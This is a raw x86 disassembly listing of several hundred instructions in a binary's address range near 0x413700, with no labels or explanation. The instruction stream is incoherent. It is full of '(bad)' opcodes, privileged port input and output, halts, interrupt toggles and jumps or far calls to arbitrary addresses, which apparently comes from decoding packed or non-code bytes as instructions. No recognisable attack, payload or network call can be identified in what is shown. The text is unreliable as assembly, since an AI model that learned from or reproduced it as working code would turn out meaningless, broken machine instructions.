  41371a:	and    BYTE PTR [ebp+0x9],dh
  41371d:	sbb    al,0xa
  41371f:	bound  ecx,QWORD PTR [esi+0x5d]
  413722:	fisubr DWORD PTR [eax+edx*2-0x7f]
  413726:	lods   eax,DWORD PTR ds:[esi]
  413727:	xchg   BYTE PTR [eax-0x6c6cfdb4],bh
  41372d:	inc    DWORD PTR [ebx+0x6c]
  413730:	mov    eax,ds:0x10460f63
  413735:	mov    BYTE PTR [edi+0x6eaab316],al
  41373b:	dec    ebp
  41373c:	xlat   BYTE PTR ds:[ebx]
  41373d:	mov    ah,0x6d
  41373f:	inc    ecx
  413740:	jne    0x413708
  413742:	xchg   esi,eax
  413743:	jo     0x4136f7
  413745:	leave  
  413746:	adc    BYTE PTR [ecx],al
  413748:	lds    edx,FWORD PTR [ebx]
  41374a:	fist   WORD PTR [edi-0x36]
  41374d:	mov    bh,0x98
  41374f:	leave  
  413750:	sahf   
  413751:	jmp    0x4137af
  413753:	mov    cl,0xb4
  413755:	mov    bl,0xe3
  413757:	(bad)  
  413758:	jb     0x41372b
  41375a:	je     0x41374b
  41375c:	add    BYTE PTR [edx-0x3dc4980c],ch
  413762:	mov    ebp,0x931a30b7
  413767:	addr16 push esi
  413769:	add    dh,BYTE PTR [esp+eax*1+0x6f6a0df5]
  413770:	xor    DWORD PTR [esi],esp
  413772:	sar    DWORD PTR [esi+0x31b594f0],1
  413778:	cwde   
  413779:	cmp    al,BYTE PTR [ebp+ebx*2+0x51]
  41377d:	fidiv  WORD PTR [ebx-0x78]
  413780:	stc    
  413781:	hlt    
  413782:	ins    BYTE PTR es:[edi],dx
  413783:	xchg   edx,eax
  413784:	xor    ch,BYTE PTR [esi-0x45]
  413787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413788:	scas   eax,DWORD PTR es:[edi]
  413789:	push   ebx
  41378a:	jno    0x4137f6
  41378c:	in     eax,0xf
  41378e:	call   0x38b7b33b
  413793:	push   cs
  413794:	inc    ebp
  413795:	adc    bh,BYTE PTR [edx+0x47e70781]
  41379b:	pop    edi
  41379c:	push   ebx
  41379d:	ror    WORD PTR [edx-0x55],0xfd
  4137a2:	sub    DWORD PTR [ecx+0x7649fa86],0xffffffe6
  4137a9:	and    DWORD PTR ds:0x69169aa5,edx
  4137af:	sub    edx,edi
  4137b1:	xchg   edx,eax
  4137b2:	inc    ebx
  4137b3:	repz mul DWORD PTR [ebx-0x3fa82e6d]
  4137ba:	xchg   ebx,eax
  4137bb:	test   DWORD PTR [edx+edi*2+0x52],eax
  4137bf:	inc    esi
  4137c0:	xchg   BYTE PTR [edx-0x35be5e98],bh
  4137c6:	and    BYTE PTR [edi+0x15f4e4ee],ah
  4137cc:	sub    al,0xfb
  4137ce:	push   edi
  4137cf:	xor    edx,0x14
  4137d2:	and    eax,0x57695514
  4137d7:	sub    esi,DWORD PTR [edi-0x3c]
  4137da:	pop    ebp
  4137db:	mov    dh,0xc
  4137dd:	stos   DWORD PTR es:[edi],eax
  4137de:	cmc    
  4137df:	test   eax,0x9e4baf1
  4137e4:	scas   al,BYTE PTR es:[edi]
  4137e5:	jle    0x41381a
  4137e7:	push   esi
  4137e8:	add    eax,0xc77a89fa
  4137ed:	(bad)  
  4137ee:	pop    ebp
  4137ef:	pop    edi
  4137f0:	mov    WORD PTR [edi+0xce4b16e],gs
  4137f6:	add    DWORD PTR [ecx+0x46],0xffffffd3
  4137fa:	mov    edx,0x1a78ef2c
  4137ff:	mov    bh,0x2c
  413801:	into   
  413802:	xor    dl,0xe5
  413805:	scas   eax,DWORD PTR es:[edi]
  413806:	mov    ah,0x21
  413808:	cmp    al,0x1f
  41380a:	not    BYTE PTR [edx]
  41380c:	ror    ebx,0x26
  41380f:	or     esi,ecx
  413811:	nop
  413812:	les    edi,FWORD PTR [ebx]
  413814:	stos   BYTE PTR es:[edi],al
  413815:	and    dh,dh
  413817:	mov    DWORD PTR [ebx],ecx
  413819:	aas    
  41381a:	mov    edi,0x4ac95c02
  41381f:	add    ch,al
  413821:	mov    ds:0x16135fd3,eax
  413826:	mov    ebx,0xe0804665
  41382b:	or     edi,eax
  41382d:	sar    dh,cl
  41382f:	mov    dl,0x74
  413831:	aam    0xbd
  413833:	push   ecx
  413834:	push   edi
  413835:	fwait
  413836:	outs   dx,BYTE PTR ds:[esi]
  413837:	jmp    0xd52a:0x523d4e7
  41383e:	int3   
  41383f:	or     ebx,DWORD PTR [ecx-0x13]
  413842:	adc    eax,0x154db8da
  413847:	in     eax,0xf
  413849:	mov    ebx,0x1c86b30b
  41384e:	pop    ebx
  41384f:	xchg   esi,eax
  413851:	fst    DWORD PTR [ebp+ecx*1+0x69906e00]
  413858:	aam    0x1c
  41385a:	mov    bh,0xbc
  41385c:	fisub  WORD PTR [bx+di+0x19]
  413860:	mov    esp,0xee9a99d6
  413865:	cmc    
  413866:	fsubr  st(4),st
  413868:	adc    dl,BYTE PTR [ebx-0x638f67a6]
  41386e:	inc    edi
  41386f:	in     eax,0x70
  413871:	psadbw mm7,mm2
  413874:	das    
  413875:	ror    DWORD PTR [edx+0x55],1
  413878:	clc    
  413879:	cli    
  41387a:	imul   ecx,DWORD PTR [edx+esi*1+0x17c1e5af],0x73d47d14
  413885:	(bad)
  413888:	inc    esp
  413889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41388a:	ds and eax,0x1b60ac7a
  413890:	jle    0x4138c1
  413892:	sbb    BYTE PTR [ebx+0x125422cd],0x84
  413899:	mov    al,ds:0xa55ef80e
  41389e:	jno    0x4138f0
  4138a0:	adc    al,0x18
  4138a2:	fdiv   DWORD PTR [edx-0x5260d0a9]
  4138a8:	xor    ch,BYTE PTR [esi-0x721f9f42]
  4138ae:	dec    esi
  4138af:	mov    al,ah
  4138b1:	push   esp
  4138b2:	scas   al,BYTE PTR es:[edi]
  4138b3:	popa   
  4138b4:	daa    
  4138b5:	adc    dh,ch
  4138b7:	push   edi
  4138b8:	sbb    eax,0xa07d86c1
  4138bd:	add    BYTE PTR [eax],dl
  4138bf:	rol    BYTE PTR [edx+0x37],0x49
  4138c3:	pop    eax
  4138c4:	mov    WORD PTR [ecx],es
  4138c6:	(bad)
  4138ca:	xchg   esi,eax
  4138cb:	lock fs sahf 
  4138ce:	jmp    0x41389c
  4138d0:	mov    esi,edi
  4138d2:	mov    al,0x56
  4138d4:	inc    ebx
  4138d5:	mov    dh,BYTE PTR [esi-0x66fb22f0]
  4138db:	jb     0x41386d
  4138dd:	aad    0x11
  4138df:	inc    esi
  4138e0:	xor    edx,DWORD PTR [esi]
  4138e2:	jmp    0x4138be
  4138e4:	pop    ebp
  4138e5:	jp     0x4138c7
  4138e7:	lods   eax,DWORD PTR ds:[esi]
  4138e8:	jecxz  0x413913
  4138ea:	jle    0x413967
  4138ec:	adc    ch,BYTE PTR [eax]
  4138ee:	push   esp
  4138ef:	pop    ebx
  4138f0:	cmp    BYTE PTR [ecx+0x76bdab5d],ah
  4138f6:	aad    0x6e
  4138f8:	dec    ebp
  4138f9:	fisub  WORD PTR [eax+0x7]
  4138fc:	or     eax,0x6128b3ea
  413901:	push   esp
  413902:	jp     0x4138dc
  413904:	adc    BYTE PTR [edi-0x5b],ch
  413907:	and    ah,BYTE PTR [esi]
  413909:	push   cs
  41390a:	enter  0x34f0,0x9d
  41390e:	test   eax,esi
  413910:	rcr    DWORD PTR [eax-0x6a],cl
  413913:	dec    edx
  413914:	fisttp DWORD PTR [eax]
  413916:	out    0x59,al
  413918:	pop    eax
  413919:	mov    edi,0x7fd117e4
  41391e:	sahf   
  41391f:	(bad)  
  413921:	xor    edx,edi
  413923:	pop    edi
  413924:	or     al,0x3
  413926:	daa    
  413927:	shl    BYTE PTR [ecx+ebp*2-0x6b],0xc2
  41392c:	inc    edx
  41392d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41392e:	add    edi,DWORD PTR [eax-0x2e]
  413931:	mov    edx,0xa065796
  413936:	xchg   ebp,eax
  413937:	sub    ecx,DWORD PTR [ecx-0x2a2c9684]
  41393d:	loopne 0x4139aa
  41393f:	sub    ebp,ebx
  413941:	push   ebp
  413942:	push   es
  413943:	jbe    0x41397c
  413945:	xchg   DWORD PTR [edi+0x5ae53bb2],ecx
  41394b:	sub    eax,0xb07e76c
  413950:	icebp  
  413951:	jnp    0x4139b9
  413953:	stos   DWORD PTR es:[edi],eax
  413954:	fld    TBYTE PTR ds:0xf690cbcc
  41395a:	xchg   DWORD PTR [edi+esi*2],esi
  41395d:	dec    edx
  41395e:	cmc    
  41395f:	popf   
  413960:	jle    0x41397b
  413962:	lods   eax,DWORD PTR ds:[esi]
  413963:	mov    edi,DWORD PTR [ecx+0x78160494]
  413969:	fidiv  WORD PTR [ebp-0x6]
  41396c:	loopne 0x413918
  41396e:	mov    ecx,0x96285f60
  413973:	int    0x7a
  413975:	jmp    0xa3fc8ca0
  41397a:	adc    BYTE PTR [esi-0x34],ch
  41397d:	js     0x4139e8
  41397f:	jns    0x4139b0
  413981:	hlt    
  413982:	add    ebp,0xffffffea
  413985:	scas   eax,DWORD PTR es:[edi]
  413986:	mov    ds:0x9e6d29bc,eax
  41398b:	dec    BYTE PTR [ebx+0x1761cdd5]
  413991:	aas    
  413992:	sbb    DWORD PTR ds:0x3127704d,eax
  413998:	xchg   DWORD PTR ds:0x1eea1879,ebp
  41399e:	cmp    bh,bl
  4139a0:	in     eax,dx
  4139a1:	xchg   edi,eax
  4139a2:	cmp    DWORD PTR [eax+ecx*1-0x54a5f537],edi
  4139a9:	out    dx,eax
  4139aa:	ds mov dh,0x8e
  4139ad:	test   al,0x40
  4139af:	inc    bl
  4139b1:	push   es
  4139b2:	ficom  WORD PTR [ebp-0x20]
  4139b5:	jnp    0x4139a9
  4139b7:	in     eax,0xfc
  4139b9:	inc    ebp
  4139ba:	mov    ebp,0x4fb05bb4
  4139bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139c0:	out    0x5a,al
  4139c2:	pushf  
  4139c3:	fbld   TBYTE PTR gs:[edi]
  4139c6:	mov    ds:0xc7636bd8,al
  4139cb:	mov    ds:0x222304d7,eax
  4139d0:	or     DWORD PTR ds:0x4c085aab,ecx
  4139d6:	out    dx,al
  4139d7:	cld    
  4139d8:	mov    ds:0x76881049,al
  4139dd:	popf   
  4139de:	ficom  DWORD PTR [eax-0x3c]
  4139e1:	pop    eax
  4139e2:	test   al,0x70
  4139e4:	jns    0x413992
  4139e6:	push   es
  4139e7:	sti    
  4139e8:	pop    esp
  4139e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139ea:	lea    ecx,[eax-0x7a]
  4139ed:	xchg   DWORD PTR [ecx+0x7f],edi
  4139f0:	outs   dx,DWORD PTR ds:[esi]
  4139f1:	jno    0x413a4d
  4139f3:	call   0x66e3:0x46c4fe63
  4139fa:	pop    edx
  4139fb:	lods   al,BYTE PTR ds:[esi]
  4139fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139fd:	and    bl,0x58
  413a00:	int    0xad
  413a02:	add    DWORD PTR ds:0x7d2278f3,ebp
  413a08:	sbb    eax,0x661ad5be
  413a0d:	jle    0x413a80
  413a0f:	mov    WORD PTR [ebx-0x2edeaf3b],fs
  413a15:	inc    esi
  413a16:	aas    
  413a17:	dec    esp
  413a18:	(bad)  
  413a19:	sbb    al,0x16
  413a1b:	rcl    bh,1
  413a1d:	fsubr  QWORD PTR [edx-0x13]
  413a20:	push   ds
  413a21:	gs sbb ah,0xaa
  413a25:	mov    dh,0x73
  413a27:	xor    eax,0xc2c2a5ed
  413a2c:	leave  
  413a2d:	sti    
  413a2e:	scas   eax,DWORD PTR es:[edi]
  413a2f:	mov    cl,0xa8
  413a31:	jmp    0x4139bb
  413a33:	in     al,dx
  413a34:	pop    ds
  413a35:	xchg   dl,cl
  413a37:	cmp    edx,DWORD PTR [edi-0x46]
  413a3a:	push   edx
  413a3b:	fs sub cl,ch
  413a3e:	adc    DWORD PTR [edi],ebx
  413a40:	xor    esi,DWORD PTR [eax-0x2b]
  413a43:	punpckhdq mm3,QWORD PTR ds:0x93d25084
  413a4a:	pop    esi
  413a4b:	shr    cl,1
  413a4d:	jle    0x413a7d
  413a4f:	mov    al,ds:0x693c66f9
  413a54:	jg     0x413a88
  413a56:	mov    cl,0xf3
  413a58:	add    DWORD PTR [esi-0x64f24576],0x47
  413a5f:	sti    
  413a60:	dec    ebx
  413a61:	and    cl,dl
  413a63:	sti    
  413a64:	cwde   
  413a65:	jb     0x413a68
  413a67:	sbb    ch,BYTE PTR [edx-0x210e4382]
  413a6d:	mov    dl,ah
  413a6f:	(bad)  
  413a70:	ins    BYTE PTR es:[edi],dx
  413a71:	stos   BYTE PTR es:[edi],al
  413a72:	clc    
  413a73:	and    DWORD PTR [ebp-0x73979791],0xffffff87
  413a7a:	jno    0x413a35
  413a7c:	mov    al,0xf7
  413a7e:	pusha  
  413a7f:	pop    eax
  413a80:	aaa    
  413a81:	imul   eax,DWORD PTR [esp+ecx*4+0x68302e91],0xffffffd8
  413a89:	jg     0x413af8
  413a8b:	dec    ebp
  413a8c:	dec    ecx
  413a8d:	lods   eax,DWORD PTR es:[esi]
  413a8f:	bound  edx,QWORD PTR ds:0x71ea5c87
  413a95:	sbb    BYTE PTR [eax],dh
  413a97:	cld    
  413a98:	ret    0x67d4
  413a9b:	xchg   esp,eax
  413a9c:	imul   ebp,DWORD PTR [edx-0x56],0xd4b7cef6
  413aa3:	dec    ebp
  413aa4:	scas   al,BYTE PTR es:[edi]
  413aa5:	rcl    DWORD PTR [eax+0x43],1
  413aa8:	push   cs
  413aa9:	lods   al,BYTE PTR ds:[esi]
  413aaa:	sahf   
  413aab:	fwait
  413aac:	jg     0x413ae4
  413aae:	jnp    0x413aaf
  413ab0:	fincstp 
  413ab2:	push   esi
  413ab3:	inc    edi
  413ab4:	ds pop ecx
  413ab6:	(bad)  
  413ab7:	bound  eax,QWORD PTR [edi]
  413ab9:	or     DWORD PTR [edi-0x16e3f984],ebp
  413abf:	addr16 jmp 0xd673:0xa74b088c
  413ac7:	fcomp  DWORD PTR [ebp+0x56]
  413aca:	pop    ds
  413acb:	mov    ds:0x64816745,eax
  413ad0:	and    edi,0x39aa46c2
  413ad6:	cmp    DWORD PTR [ebp-0x25],ecx
  413ad9:	xor    edx,DWORD PTR [edx-0x17]
  413adc:	xchg   dl,al
  413ade:	jmp    0xc0f6:0x30481f60
  413ae5:	fsub   DWORD PTR [ebx-0x130450de]
  413aeb:	sub    BYTE PTR [ebx+edx*4],0x7e
  413aef:	jnp    0x413b0e
  413af1:	jbe    0x413b66
  413af3:	push   ebp
  413af4:	mov    al,0xc5
  413af6:	push   ebp
  413af7:	adc    esi,0xffffffe7
  413afa:	dec    ebx
  413afb:	int    0x1f
  413afd:	test   al,0x3a
  413aff:	data16 hlt 
  413b01:	pop    ebx
  413b02:	sbb    BYTE PTR [edx+0x603e35c6],dl
  413b08:	les    eax,FWORD PTR [ebx+0x34]
  413b0b:	xchg   edx,eax
  413b0c:	inc    eax
  413b0d:	cmp    DWORD PTR [edi-0x7dad27b5],eax
  413b13:	and    eax,0xb9516719
  413b18:	sbb    ch,bl
  413b1a:	repnz in eax,0x7b
  413b1d:	sub    eax,0x5202f3c2
  413b22:	jle    0x413b7b
  413b24:	jno    0x413b2d
  413b26:	inc    edx
  413b27:	adc    DWORD PTR [edi+edi*2-0x3e101526],0x801c7601
  413b32:	jg     0x413ba8
  413b34:	(bad)  
  413b35:	std    
  413b36:	dec    esi
  413b37:	xchg   DWORD PTR [edi],edx
  413b39:	pop    edx
  413b3a:	dec    ebx
  413b3b:	or     DWORD PTR [ebx-0x417975be],edi
  413b41:	lahf   
  413b42:	mov    ah,0x98
  413b44:	es daa 
  413b46:	mov    ecx,0x172d9c1b
  413b4b:	hlt    
  413b4c:	idiv   DWORD PTR [ecx+0x21]
  413b4f:	push   0x402ac7c8
  413b54:	push   ds
  413b55:	test   eax,edi
  413b57:	sbb    BYTE PTR [edi-0x7a],0x5a
  413b5b:	mov    eax,edx
  413b5d:	clc    
  413b5e:	outs   dx,BYTE PTR ds:[esi]
  413b5f:	jns    0x413b16
  413b61:	fdivrp st(0),st
  413b63:	dec    ebp
  413b64:	dec    esi
  413b65:	leave  
  413b66:	stos   DWORD PTR es:[edi],eax
  413b67:	ret    
  413b68:	dec    ebx
  413b69:	(bad)  
  413b6a:	jecxz  0x413bd8
  413b6c:	inc    ecx
  413b6d:	idiv   DWORD PTR ds:0xf8ebaa88
  413b73:	dec    edi
  413b74:	out    0xb2,eax
  413b76:	js     0x413b9e
  413b78:	(bad)  
  413b7a:	add    BYTE PTR [ebp+0x4f4d6133],ch
  413b80:	daa    
  413b81:	popa   
  413b82:	pop    esi
  413b83:	mov    dl,0x86
  413b85:	adc    esp,DWORD PTR [ebp+0x11e54588]
  413b8b:	loop   0x413b78
  413b8d:	imul   ecx,DWORD PTR [ecx-0x656c0d2b],0x62b033cc
  413b97:	(bad)  
  413b98:	jge    0x413bd1
  413b9a:	out    0xa2,al
  413b9c:	sbb    eax,0xaa86783e
  413ba1:	push   eax
  413ba2:	cmp    ebx,eax
  413ba4:	dec    esi
  413ba5:	dec    BYTE PTR [edx+eiz*4]
  413ba8:	and    bl,BYTE PTR [ecx-0x1a]
  413bab:	fdivr  QWORD PTR [eax]
  413bad:	mov    ecx,0x49a59302
  413bb2:	retf   0xfe95
  413bb5:	stos   DWORD PTR es:[edi],eax
  413bb6:	add    BYTE PTR [ebp-0x1d0620c3],ah
  413bbc:	or     al,0xe6
  413bbe:	dec    edi
  413bbf:	sbb    eax,0x95c4607b
  413bc4:	fwait
  413bc5:	(bad)  
  413bc6:	not    BYTE PTR [edi-0x73a7c2d3]
  413bcc:	push   edx
  413bcd:	(bad)  
  413bce:	loopne 0x413c06
  413bd0:	or     edx,ecx
  413bd2:	or     al,0x90
  413bd4:	sahf   
  413bd5:	mov    edi,0x43ec8d6d
  413bda:	lds    ebp,FWORD PTR [edx-0x4d]
  413bdd:	inc    bh
  413bdf:	add    bh,BYTE PTR [ecx+0x18]
  413be2:	ror    BYTE PTR [esi],0xf1
  413be5:	fmul   QWORD PTR [eax]
  413be7:	xchg   ecx,eax
  413be8:	je     0x413c3b
  413bea:	push   ebp
  413beb:	fidiv  DWORD PTR [eax-0x41c07212]
  413bf1:	push   esi
  413bf2:	cmp    eax,0x9d1891a7
  413bf7:	jp     0x413b8e
  413bf9:	inc    esp
  413bfa:	push   edx
  413bfb:	int    0x22
  413bfd:	loop   0x413ba1
  413bff:	pop    ss
  413c00:	adc    DWORD PTR [ebx-0x6d4f64ec],edx
  413c06:	(bad)  
  413c07:	loop   0x413baf
  413c09:	loope  0x413bd5
  413c0b:	pop    ss
  413c0c:	shl    BYTE PTR [edi-0x1d],1
  413c0f:	adc    DWORD PTR [edx],0x75
  413c12:	sub    DWORD PTR [esi-0x2f5703c2],0xffffffb3
  413c19:	xlat   BYTE PTR gs:[ebx]
  413c1b:	stc    
  413c1c:	cdq    
  413c1d:	pop    eax
  413c1e:	or     bl,BYTE PTR [ebx-0x2d]
  413c21:	bound  edx,QWORD PTR [edi-0x43da06d3]
  413c27:	mov    ebx,0x1f7f3829
  413c2c:	inc    ecx
  413c2d:	idiv   ebx
  413c2f:	xchg   edi,eax
  413c30:	push   ds
  413c31:	fimul  DWORD PTR [eax]
  413c33:	inc    edx
  413c34:	mov    dh,cl
  413c36:	pop    edx
  413c37:	into   
  413c38:	test   BYTE PTR [edx],dl
  413c3a:	add    ah,BYTE PTR [ebx-0x41a1851b]
  413c40:	sub    BYTE PTR [ebx],al
  413c42:	inc    BYTE PTR [edi-0x6e]
  413c45:	mov    cl,0xb0
  413c47:	imul   edi,DWORD PTR [eax+0x56],0xdb78f3b0
  413c4e:	in     eax,dx
  413c4f:	mov    fs,edi
  413c51:	mov    ch,0x3b
  413c53:	jmp    0x95be:0x2504bc2c
  413c5a:	cli    
  413c5b:	mov    ch,0xc0
  413c5d:	xchg   ecx,eax
  413c5e:	arpl   WORD PTR [ecx],sp
  413c60:	xor    BYTE PTR [ecx+0xd],ah
  413c63:	and    cl,BYTE PTR [ebx]
  413c65:	or     DWORD PTR es:[eax+0x3b],edx
  413c69:	daa    
  413c6a:	mov    ah,0x47
  413c6c:	sub    al,BYTE PTR ds:0x9dd625cc
  413c72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c73:	jg     0x413c91
  413c75:	int3   
  413c76:	(bad)  
  413c77:	adc    BYTE PTR [ebp-0x2b348288],ah
  413c7d:	div    BYTE PTR [ebx-0x38]
  413c80:	cmp    al,0xea
  413c82:	and    eax,0xa72467b4
  413c87:	lods   eax,DWORD PTR ds:[esi]
  413c88:	and    BYTE PTR [ebx],al
  413c8a:	mul    DWORD PTR [ebp+edi*4-0x54]
  413c8e:	lea    ebp,[edx]
  413c90:	hlt    
  413c91:	pop    ss
  413c92:	mov    eax,ds:0xe8617788
  413c97:	rcl    DWORD PTR [ebx],cl
  413c99:	xor    eax,0x7aed9ff7
  413c9e:	cli    
  413c9f:	pop    edx
  413ca0:	out    dx,eax
  413ca1:	adc    DWORD PTR [edx-0x7a],ecx
  413ca4:	rcl    BYTE PTR [edx+0x2a],cl
  413ca7:	sbb    al,0x3e
  413ca9:	ds cli 
  413cab:	mov    eax,ds:0xef6cf8ff
  413cb0:	outs   dx,DWORD PTR ds:[esi]
  413cb1:	or     DWORD PTR [edi-0x6300d060],0x3
  413cb8:	mov    dl,0x17
  413cba:	ss xchg esp,eax
  413cbc:	push   eax
  413cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cbe:	jg     0x413c78
  413cc0:	std    
  413cc1:	add    ah,BYTE PTR [ebp-0x2c2cf3b7]
  413cc7:	sub    DWORD PTR [ebx+0x79264058],eax
  413ccd:	push   ebx
  413cce:	aam    0x7f
  413cd0:	in     eax,dx
  413cd1:	push   ecx
  413cd2:	mov    ebp,0x157f6782
  413cd7:	jl     0x413c89
  413cd9:	and    BYTE PTR [edi],cl
  413cdb:	cmp    BYTE PTR [ebp-0x2f],dh
  413cde:	fldenv [ebx+ebp*4]
  413ce1:	sub    esi,DWORD PTR [ecx-0x55]
  413ce4:	sbb    eax,0x445ebe35
  413ce9:	mov    ecx,0x716c9d3a
  413cee:	cld    
  413cef:	jl     0x413ce7
  413cf1:	(bad)  
  413cf2:	sub    al,0x2f
  413cf4:	mov    ecx,0x60630f21
  413cf9:	shl    BYTE PTR [edx-0x3e],1
  413cfc:	outs   dx,BYTE PTR ds:[esi]
  413cfd:	aaa    
  413cfe:	inc    esp
  413cff:	inc    BYTE PTR [eax-0x16fbdc3a]
  413d05:	ja     0x413d06
  413d07:	std    
  413d08:	jl     0x413d28
  413d0a:	call   0x1ea93191
  413d0f:	cmp    ch,BYTE PTR [eax]
  413d11:	mov    dl,0x54
  413d13:	push   ecx
  413d14:	sub    bl,BYTE PTR [ebx-0x34a8e598]
  413d1a:	sbb    BYTE PTR [edi+0x30],0x23
  413d1e:	sub    dh,bl
  413d20:	in     eax,dx
  413d21:	adc    ecx,ecx
  413d23:	addr16 mov ds:0xc9fb,al
  413d27:	repz push ss
  413d29:	pop    ebp
  413d2a:	rcl    BYTE PTR [ebp-0x4710932],cl
  413d30:	bound  esp,QWORD PTR cs:[edi-0x75]
  413d34:	test   al,0x14
  413d36:	cmp    eax,0x6702fea3
  413d3b:	jp     0x413cfb
  413d3d:	mov    al,fs:0xead1a0c5
  413d43:	mov    eax,0x78db92d4
  413d48:	scas   al,BYTE PTR es:[edi]
  413d49:	or     eax,DWORD PTR [eax]
  413d4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d4c:	add    esi,edi
  413d4e:	pop    eax
  413d4f:	mov    ch,0xa8
  413d51:	xor    eax,0xd913a311
  413d56:	(bad)  
  413d57:	call   0x11482dbd
  413d5c:	inc    esp
  413d5d:	dec    eax
  413d5e:	fsubr  QWORD PTR [ecx]
  413d60:	xor    ch,ah
  413d62:	dec    edi
  413d63:	mov    eax,ds:0xb890868e
  413d68:	rcr    BYTE PTR [edi],1
  413d6a:	in     al,0xcf
  413d6c:	repnz mov ecx,0xe159799c
  413d72:	je     0x413d77
  413d74:	lods   al,BYTE PTR ds:[esi]
  413d75:	and    cl,0x8e
  413d78:	retf   
  413d79:	pop    ss
  413d7a:	mov    edx,0x812e8885
  413d7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d80:	add    eax,0x78cd2a84
  413d85:	std    
  413d86:	and    DWORD PTR [ecx],ecx
  413d88:	aam    0x63
  413d8a:	out    0xa7,al
  413d8c:	add    BYTE PTR [esi+0x2851a07d],ah
  413d92:	(bad)  
  413d93:	aad    0xce
  413d95:	jg     0x413d8d
  413d97:	pop    edx
  413d98:	xchg   esi,edi
  413d9a:	mov    ch,0x86
  413d9c:	inc    ebp
  413d9d:	js     0x413d49
  413d9f:	pop    ds
  413da0:	and    eax,DWORD PTR [edi-0x72caecc3]
  413da6:	jo     0x413ded
  413da8:	arpl   WORD PTR [esi-0x7e],bp
  413dab:	shl    BYTE PTR [edx-0x47],1
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    ds:0xed27915d,eax
  413db4:	out    dx,eax
  413db5:	das    
  413db6:	and    ecx,DWORD PTR [eax+0x11]
  413db9:	mov    al,ds:0xadf53552
  413dbe:	and    dl,dl
  413dc0:	div    BYTE PTR [ebp-0x7cd9027b]
  413dc6:	sbb    DWORD PTR [eax-0xf],ebp
  413dc9:	mov    ebp,0x6ea21af
  413dce:	test   eax,0x6fe7aa6b
  413dd3:	imul   ebp,ebp,0x68
  413dd6:	or     esp,DWORD PTR [ecx-0x43]
  413dd9:	loop   0x413d97
  413ddb:	popf   
  413ddc:	(bad)  [ebx-0x3c]
  413ddf:	stos   BYTE PTR es:[edi],al
  413de0:	fstp   TBYTE PTR [edx+0x24ebea3]
  413de6:	cdq    
  413de7:	push   eax
  413de8:	int3   
  413de9:	test   cl,bh
  413deb:	aaa    
  413dec:	push   edx
  413ded:	or     eax,0xdc30247
  413df2:	dec    ebx
  413df3:	jno    0x413df4
  413df5:	xchg   esi,eax
  413df6:	std    
  413df7:	ret    
  413df8:	mul    esp
  413dfa:	mov    ecx,0xea63b895
  413dff:	sbb    BYTE PTR [ebp-0x52],bl
  413e02:	add    edi,0x3e9873a2
  413e08:	imul   edi,esi,0x6ea07836
  413e0e:	ds and eax,0x3a6709f0
  413e14:	mov    ds:0xde400047,al
  413e19:	imul   ecx,edx,0x3b0560b7
  413e1f:	je     0x413e5b
  413e21:	out    dx,eax
  413e22:	mov    DWORD PTR [ecx],esi
  413e24:	pop    ebx
  413e25:	rcr    ecx,1
  413e27:	push   cs
  413e28:	shl    DWORD PTR [edi-0x19e33ae7],1
  413e2e:	sbb    ch,BYTE PTR [ebx]
  413e30:	jmp    0x413e0c
  413e32:	lea    ecx,[ecx]
  413e34:	add    edi,eax
  413e36:	dec    edx
  413e37:	repnz stos BYTE PTR es:[edi],al
  413e39:	and    al,0xf6
  413e3b:	out    dx,eax
  413e3c:	xchg   ebx,eax
  413e3d:	mov    eax,0xd819242b
  413e42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e43:	add    esi,DWORD PTR [edx+0x35edcf91]
  413e49:	sar    DWORD PTR [esi-0x25],1
  413e4c:	mov    esi,DWORD PTR [eax-0x1f824b4d]
  413e52:	shl    DWORD PTR [edx+0x102e62e7],cl
  413e58:	or     DWORD PTR [ecx],esi
  413e5a:	sbb    DWORD PTR [ebp+0x5dd44385],0xffffff94
  413e61:	call   0x2f94:0x93cfe642
  413e68:	fild   QWORD PTR [edi-0x469c9ec]
  413e6e:	or     al,0xe8
  413e70:	iret   
  413e71:	in     al,dx
  413e72:	(bad)  
  413e73:	or     BYTE PTR [ecx+0x752f6a74],dh
  413e79:	popf   
  413e7a:	shr    DWORD PTR [ecx],0x89
  413e7d:	mov    esi,0x2035c58
  413e82:	dec    eax
  413e83:	mov    bl,0x71
  413e85:	loopne 0x413ea3
  413e87:	sub    DWORD PTR [ebx+0x1114da32],ecx
  413e8d:	or     DWORD PTR [esi-0x5fe33011],0xffffffa9
  413e94:	mov    ecx,0xe4a9fa46
  413e99:	xlat   BYTE PTR ds:[ebx]
  413e9a:	mov    eax,ds:0xc7b95bce
  413e9f:	std    
  413ea0:	pop    ds
  413ea1:	dec    ecx
  413ea2:	in     al,0x91
  413ea4:	(bad)  
  413ea6:	popf   
  413ea7:	pop    esp
  413ea8:	ret    0x979b
  413eab:	out    dx,eax
  413eac:	xchg   edx,eax
  413ead:	pop    ecx
  413eae:	push   edx
  413eaf:	push   es
  413eb0:	call   0xad7fadd9
  413eb5:	sbb    BYTE PTR [ebx],ah
  413eb7:	leave  
  413eb8:	add    DWORD PTR [ebp+0x619cb5b3],edx
  413ebe:	sub    eax,0xfeade9
  413ec3:	cmp    DWORD PTR [edx+eiz*1-0x2d818a1c],0xb50d039a
  413ece:	sub    ecx,ebx
  413ed0:	inc    eax
  413ed1:	inc    ebx
  413ed2:	mov    esp,0xa9452993
  413ed7:	adc    DWORD PTR [ebx+0x567ea43e],edx
  413edd:	inc    ebx
  413ede:	adc    ch,ch
  413ee0:	push   esi
  413ee1:	and    al,0x82
  413ee3:	lock or DWORD PTR [edi+ecx*2-0x6ec10ca],ecx
  413eeb:	xchg   BYTE PTR [esi+ebx*2],bh
  413eee:	fyl2xp1 
  413ef0:	xchg   bh,cl
  413ef2:	xchg   ebp,eax
  413ef3:	sbb    DWORD PTR [eax],esi
  413ef5:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
